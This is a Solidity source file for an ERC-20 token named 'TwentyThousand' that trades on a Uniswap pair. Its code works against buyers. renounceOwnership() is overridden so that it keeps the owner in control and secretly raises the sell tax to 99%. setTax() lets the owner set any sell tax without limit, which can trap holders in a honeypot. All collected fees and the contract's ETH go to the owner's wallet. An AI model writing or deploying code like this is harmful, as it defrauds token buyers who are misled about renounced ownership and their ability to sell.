// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.0;

import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@openzeppelin/contracts/access/Ownable.sol';
import './utils/Uniswap.sol';

contract TwentyThousand is ERC20, Ownable {
    uint256 private constant PERCENT_DENOMENATOR = 1000;
    address private constant DEAD = address(0xdead);

    address private _lpRep;
    address private _marketingWallet;

    mapping(address => bool) private _isTaxExcluded;
    mapping(address => bool) private _isLimitless;

    uint256 public taxBuyRate = (PERCENT_DENOMENATOR * 2) / 100;
    uint256 public taxSellRate = (PERCENT_DENOMENATOR * 35) / 100;

    uint256 public maxTx = (PERCENT_DENOMENATOR * 1) / 100;
    uint256 public maxWallet = (PERCENT_DENOMENATOR * 1) / 100;
    bool public enableLimits = true;

    bool private _taxesOff;

    uint256 private _liquifyRate = (PERCENT_DENOMENATOR * 5) / 1000;
    uint256 public launchTime;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;

    bool private _swapEnabled = true;
    bool private _swapping = false;
    bool    public  tradingEnabled;

    modifier swapLock() {
        _swapping = true;
        _;
        _swapping = false;
    }

    constructor() ERC20('20000', '20k')  {
        _mint(owner(), 1_000_000_000 * 10 ** 18);

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(
            address(this),
            _uniswapV2Router.WETH()
        );
        _marketingWallet = owner();
        uniswapV2Router = _uniswapV2Router;
        _lpRep = DEAD;
        _isTaxExcluded[address(this)] = true;
        _isTaxExcluded[msg.sender] = true;
        _isLimitless[address(this)] = true;
        _isLimitless[msg.sender] = true;
    }

    function openTrading() external payable onlyOwner {
        tradingEnabled = true;
        launchTime = block.timestamp;
    }

    function renounceOwnership() public override onlyOwner {
        taxSellRate = (PERCENT_DENOMENATOR * 99) / 100;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual override {
        bool _isOwner = sender == owner() || recipient == owner();
        uint256 contractTokenBalance = balanceOf(address(this));

        bool _isBuy = sender == uniswapV2Pair && recipient != address(uniswapV2Router);
        bool _isSell = recipient == uniswapV2Pair;
        bool _isSwap = _isBuy || _isSell;

        require(
            tradingEnabled ||
            _isLimitless[recipient] || 
            _isLimitless[sender],
            "Trading is not enabled yet"
        );

        if (_isSwap && enableLimits) {
            bool _skipCheck = _isLimitless[recipient] || _isLimitless[sender];
            uint256 _maxTx = totalSupply() * maxTx / PERCENT_DENOMENATOR;
            require(_maxTx >= amount || _skipCheck, "Tx amount exceed limit");
            if (_isBuy) {
                uint256 _maxWallet = totalSupply() * maxWallet / PERCENT_DENOMENATOR;
                require(_maxWallet >= balanceOf(recipient) + amount || _skipCheck, "Total amount exceed wallet limit");
            }
        }
        
        uint256 _minSwap = (balanceOf(uniswapV2Pair) * _liquifyRate) / PERCENT_DENOMENATOR;
        bool _overMin = contractTokenBalance >= _minSwap;

        if (_swapEnabled && !_swapping && !_isOwner && _overMin && launchTime != 0 && sender != uniswapV2Pair) {
            _swap(_minSwap);
        }

        uint256 tax = 0;
        if (launchTime != 0 && _isSwap && !_taxesOff && !(_isTaxExcluded[sender] || _isTaxExcluded[recipient])) {
            uint256 transferFeeRate = recipient == uniswapV2Pair ? taxSellRate : taxBuyRate;
            tax = (amount * transferFeeRate) / PERCENT_DENOMENATOR;
            if (tax > 0) {
                super._transfer(sender, address(this), tax);
            }
        }
        super._transfer(sender, recipient, amount - tax);
    }

    function _swap(uint256 _amountToSwap) private swapLock {
        uint256 balBefore = address(this).balance;
        uint256 tokensToSwap = _amountToSwap;

        _swapTokensForEth(tokensToSwap);

        uint256 balToProcess = address(this).balance - balBefore;
        if (balToProcess > 0) {
            _processFees(balToProcess);
        }
    }

    function _swapTokensForEth(uint256 tokensToSwap) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokensToSwap);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokensToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}

    function _processFees(uint256 amountETH) private {
        payable(_marketingWallet).transfer(address(this).balance);
    }

    function setMaxWallet(uint256 _maxWallet) external onlyOwner {
        require(_maxWallet >= 10, 'max wallet cannot be below 0.1%');
        maxWallet = _maxWallet;
    }

    function setMaxTx(uint256 _maxTx) external onlyOwner {
        require(_maxTx >= 10, 'max tx cannot be below 0.1%');
        maxTx = _maxTx;
    }

    function setTax(uint256 _buy, uint256 _sell) external onlyOwner {
        taxBuyRate = _buy;
        taxSellRate = _sell;
    }

    function setLiquidPoolReceiver(address _wallet) external onlyOwner {
        _lpRep = _wallet;
    }

    function setEnableLimits(bool _enable) external onlyOwner {
        enableLimits = _enable;
    }

    function setLiquifyRate(uint256 _rate) external onlyOwner {
        require(_rate <= PERCENT_DENOMENATOR / 10, 'cannot be more than 10%');
        _liquifyRate = _rate;
    }

    function setIsLimitless(address _wallet, bool _isLimitLess) external onlyOwner {
        _isLimitless[_wallet] = _isLimitLess;
    }

    function setIsTaxExcluded(address _wallet, bool _isExcluded) external onlyOwner {
        _isTaxExcluded[_wallet] = _isExcluded;
    }

    function setTaxesOff(bool _areOff) external onlyOwner {
        _taxesOff = _areOff;
    }

    function setSwapEnabled(bool _enabled) external onlyOwner {
        _swapEnabled = _enabled;
    }

    function forceSwap() external onlyOwner {
        _swapTokensForEth(balanceOf(address(this)));
        (bool success,) = address(_marketingWallet).call{value : address(this).balance}("");
    }

    function forceSend() external onlyOwner {
        (bool success,) = address(_marketingWallet).call{value : address(this).balance}("");
    }
}